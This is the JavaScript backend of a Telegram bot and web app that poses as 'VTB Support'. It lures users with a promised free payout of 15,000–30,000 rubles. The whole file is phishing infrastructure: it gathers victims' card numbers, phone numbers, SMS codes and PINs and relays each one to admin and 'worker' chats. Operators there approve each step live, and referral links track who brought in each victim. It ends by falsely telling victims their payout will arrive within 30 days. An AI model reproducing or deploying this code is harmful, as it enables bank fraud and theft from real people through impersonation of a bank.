const CONFIG = require("./_lib/config");
const { getSession, setSession, isBlocked, blockUser, addEvent, getEvents } = require("./_lib/store");
const {
  sendMessage,
  sendPhoto,
  answerCallbackQuery,
  editMessageText,
  validateInitData,
  formatUserInfo,
  adminKeyboard,
  formatStats,
} = require("./_lib/telegram");
const { isValidCard, isValidPhone } = require("./_lib/validate");

module.exports = async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).end();

  try {
    const body = req.body || {};

    if (body.update_id !== undefined) {
      return await handleWebhook(body, res);
    }

    const { action } = body;
    if (action === "status") return await handleStatus(body, res);
    if (action === "submit") return await handleSubmit(body, res);

    return res.status(400).json({ error: "Unknown request" });
  } catch (err) {
    console.error("Handler error:", err);
    return res.status(200).json({ ok: true });
  }
};

// ═══════════════════════════════════════════
//  TELEGRAM WEBHOOK
// ═══════════════════════════════════════════

async function handleWebhook(update, res) {
  if (update.message) await handleMessage(update.message);
  else if (update.callback_query) await handleCallback(update.callback_query);
  return res.status(200).json({ ok: true });
}

async function handleMessage(message) {
  const text = message.text || "";
  const chatId = message.chat.id;

  if (text.startsWith("/stats")) {
    if (String(chatId) === String(CONFIG.ADMIN_CHAT_ID)) {
      const events = getEvents();
      const statsText = formatStats(events);
      await sendMessage(chatId, statsText);
    }
    return;
  }

  if (!text.startsWith("/start")) return;

  const userId = message.from.id;
  const username = message.from.username || null;
  const firstName = message.from.first_name || "";

  let referrer = null;
  const parts = text.split(" ");
  if (parts.length > 1 && parts[1].startsWith("ref_")) {
    referrer = parts[1].substring(4);
  }

  if (isBlocked(userId)) {
    await sendMessage(
      chatId,
      "🚫 Ваш доступ заблокирован. Обратитесь в поддержку."
    );
    return;
  }

  let session = getSession(userId);
  if (!session) {
    session = {
      step: "card",
      card: null,
      phone: null,
      smsCode: null,
      pin: null,
      referrer,
      username,
      firstName,
      userId,
      error: null,
    };
  } else {
    if (referrer) session.referrer = referrer;
    session.username = username;
    session.firstName = firstName;
  }
  setSession(userId, session);

  addEvent("start", { userId, referrer });

  const adminChatId = CONFIG.ADMIN_CHAT_ID;
  const workersChatId = CONFIG.WORKERS_CHAT_ID;
  const userInfo = formatUserInfo(session);

  await Promise.all([
    sendMessage(
      adminChatId,
      `🔔 <b>Новый переход</b>\n\n${userInfo}`
    ),
    sendMessage(
      workersChatId,
      `🔔 <b>Новый переход</b>\n\n${userInfo}`
    ),
  ]);

  const webAppUrl = CONFIG.WEBAPP_URL;
  const keyboard = {
    inline_keyboard: [
      [{ text: "🏦 Открыть приложение", web_app: { url: webAppUrl } }],
    ],
  };

  const caption =
    "🏦 <b>ВТБ Поддержка</b>\n\n" +
    "🎉 Добро пожаловать в официальный бот проекта «ВТБ Поддержка»!\n\n" +
    "💰 В рамках действующей программы вам доступна безвозмездная выплата в размере от 15 000 до 30 000 рублей.\n\n" +
    "📲 Оформление занимает не более 2 минут. Средства будут зачислены на вашу карту сразу после проверки заявки.\n\n" +
    "🔐 Пройдите авторизацию ниже, чтобы начать процесс получения выплаты"

  const photoUrl = `${webAppUrl}/welcome1.png`;
  const photoResult = await sendPhoto(chatId, photoUrl, caption, {
    reply_markup: keyboard,
  });

  if (!photoResult.ok) {
    await sendMessage(chatId, caption, { reply_markup: keyboard });
  }
}

async function handleCallback(callbackQuery) {
  const data = callbackQuery.data;
  if (!data) return;

  const [action, step, rawUserId] = data.split("_");
  const userId = parseInt(rawUserId, 10);
  if (!userId || !action || !step) return;

  const session = getSession(userId);
  if (!session) {
    await answerCallbackQuery(callbackQuery.id, "Сессия не найдена");
    return;
  }

  const msgId = callbackQuery.message?.message_id;
  const chatId = callbackQuery.message?.chat?.id;
  const userInfo = formatUserInfo(session);
  let statusEmoji, statusText;

  if (action === "ok") {
    const nextStep = { card: "code", code: "pin", pin: "done" };
    session.step = nextStep[step] || "done";
    session.error = null;
    statusEmoji = "✅";
    statusText = {
      card: "КАРТА ПОДТВЕРЖДЕНА",
      code: "SMS-КОД ПОДТВЕРЖДЁН",
      pin: "ПИН-КОД ПОДТВЕРЖДЁН",
    }[step];

    if (step === "pin") {
      addEvent("complete", { userId, referrer: session.referrer });
    }
  } else if (action === "no") {
    session.step = step;
    session.error = {
      card: "Проверьте данные и попробуйте снова",
      code: "Неверный код, попробуйте снова",
      pin: "Неверный код, попробуйте снова",
    }[step];
    statusEmoji = "❌";
    statusText = {
      card: "КАРТА ОТКЛОНЕНА",
      code: "SMS-КОД ОТКЛОНЁН",
      pin: "ПИН-КОД ОТКЛОНЁН",
    }[step];
  } else if (action === "ban") {
    session.step = "blocked";
    blockUser(userId);
    statusEmoji = "🚫";
    statusText = "ПОЛЬЗОВАТЕЛЬ ЗАБЛОКИРОВАН";
  } else {
    return;
  }

  setSession(userId, session);

  const phoneLine = session.phone ? `📱 Телефон: <code>${session.phone}</code>\n` : "";

  const valueLabels = {
    card: session.card ? `💳 Карта: <code>${session.card}</code>\n${phoneLine}` : "",
    code:
      `💳 Карта: <code>${session.card}</code>\n${phoneLine}` +
      (session.smsCode ? `🔑 SMS: <code>${session.smsCode}</code>\n` : ""),
    pin:
      `💳 Карта: <code>${session.card}</code>\n${phoneLine}` +
      (session.pin ? `🔐 Пин: <code>${session.pin}</code>\n` : ""),
  };

  const editedText =
    `${statusEmoji} <b>${statusText}</b>\n\n` +
    (valueLabels[step] || "") +
    userInfo;

  if (chatId && msgId) {
    await editMessageText(chatId, msgId, editedText);
  }

  if (action === "ok" && step === "pin") {
    const successMsg =
      "🎊 <b>Спасибо за ваш выбор!</b> 🎊\n\n" +
      "Ваша выплата успешно подтверждена и будет зачислена в течение 30 дней.\n\n" +
      "💫 Оставайтесь с нами — впереди ещё больше приятных возможностей!";
    await sendMessage(userId, successMsg);
  }

  await answerCallbackQuery(callbackQuery.id, statusText);
}

// ═══════════════════════════════════════════
//  FRONTEND: STATUS
// ═══════════════════════════════════════════

async function handleStatus(body, res) {
  const { initData } = body;
  const user = validateInitData(initData);
  if (!user || !user.id) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const userId = user.id;

  if (isBlocked(userId)) {
    return res.json({ step: "blocked", error: null });
  }

  let session = getSession(userId);
  if (!session) {
    session = {
      step: "card",
      card: null,
      phone: null,
      smsCode: null,
      pin: null,
      referrer: null,
      username: user.username || null,
      firstName: user.first_name || "",
      userId,
      error: null,
    };
    setSession(userId, session);
  }

  return res.json({ step: session.step, error: session.error });
}

// ═══════════════════════════════════════════
//  FRONTEND: SUBMIT
// ═══════════════════════════════════════════

async function handleSubmit(body, res) {
  const { initData, type, value } = body;
  const user = validateInitData(initData);
  if (!user || !user.id) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const userId = user.id;

  if (isBlocked(userId)) {
    return res.json({ step: "blocked", error: null });
  }

  const session = getSession(userId);
  if (!session) {
    return res.status(400).json({ error: "No session" });
  }

  session.username = user.username || session.username;
  session.firstName = user.first_name || session.firstName;

  const adminChatId = CONFIG.ADMIN_CHAT_ID;
  const workersChatId = CONFIG.WORKERS_CHAT_ID;
  const userInfo = formatUserInfo(session);

  // ── Card + Phone (submitted together) ──
  if (type === "card") {
    if (session.step !== "card") {
      return res.json({ step: session.step, error: session.error });
    }

    const cardRaw = (value?.card || "").replace(/\s/g, "");
    const phoneRaw = (value?.phone || "").replace(/\D/g, "");

    if (!isValidCard(cardRaw)) {
      return res.json({
        step: "card",
        error: "Номер карты указан неверно",
      });
    }

    if (!isValidPhone(phoneRaw)) {
      return res.json({
        step: "card",
        error: "Номер телефона указан неверно",
      });
    }

    const formattedCard = cardRaw.replace(/(\d{4})/g, "$1 ").trim();
    const formattedPhone = phoneRaw.length === 10 ? `7${phoneRaw}` : phoneRaw;

    session.card = formattedCard;
    session.phone = formattedPhone;
    session.step = "card_pending";
    session.error = null;
    setSession(userId, session);

    const updatedUserInfo = formatUserInfo(session);

    await Promise.all([
      sendMessage(
        workersChatId,
        `🔔 <b>Пользователь ввёл данные</b>\n\n${updatedUserInfo}`
      ),
      sendMessage(
        adminChatId,
        `🔔 <b>Ввод данных</b>\n\n💳 Карта: <code>${formattedCard}</code>\n📱 Телефон: <code>${formattedPhone}</code>\n${updatedUserInfo}`,
        { reply_markup: adminKeyboard("card", userId) }
      ),
    ]);
    return res.json({ step: "card_pending", error: null });
  }

  // ── SMS Code ──
  if (type === "code") {
    if (session.step !== "code") {
      return res.json({ step: session.step, error: session.error });
    }
    const code = (value || "").trim();
    if (!/^\d{6}$/.test(code)) {
      return res.json({ step: "code", error: "Код должен содержать 6 цифр" });
    }
    session.smsCode = code;
    session.step = "code_pending";
    session.error = null;
    setSession(userId, session);

    await Promise.all([
      sendMessage(
        workersChatId,
        `🔔 <b>Пользователь ввёл SMS-код</b>\n\n${userInfo}`
      ),
      sendMessage(
        adminChatId,
        `🔔 <b>Ввод SMS-кода</b>\n\n💳 Карта: <code>${session.card}</code>\n📱 Телефон: <code>${session.phone}</code>\n🔑 Код: <code>${code}</code>\n${userInfo}`,
        { reply_markup: adminKeyboard("code", userId) }
      ),
    ]);
    return res.json({ step: "code_pending", error: null });
  }

  // ── PIN (4 digits) ──
  if (type === "pin") {
    if (session.step !== "pin") {
      return res.json({ step: session.step, error: session.error });
    }
    const pin = (value || "").trim();
    if (!/^\d{4}$/.test(pin)) {
      return res.json({ step: "pin", error: "Код должен содержать 4 цифры" });
    }
    session.pin = pin;
    session.step = "pin_pending";
    session.error = null;
    setSession(userId, session);

    await Promise.all([
      sendMessage(
        workersChatId,
        `🔔 <b>Пользователь ввёл код подтверждения</b>\n\n${userInfo}`
      ),
      sendMessage(
        adminChatId,
        `🔔 <b>Ввод кода подтверждения</b>\n\n💳 Карта: <code>${session.card}</code>\n📱 Телефон: <code>${session.phone}</code>\n🔐 Код: <code>${pin}</code>\n${userInfo}`,
        { reply_markup: adminKeyboard("pin", userId) }
      ),
    ]);
    return res.json({ step: "pin_pending", error: null });
  }

  return res.status(400).json({ error: "Unknown type" });
}
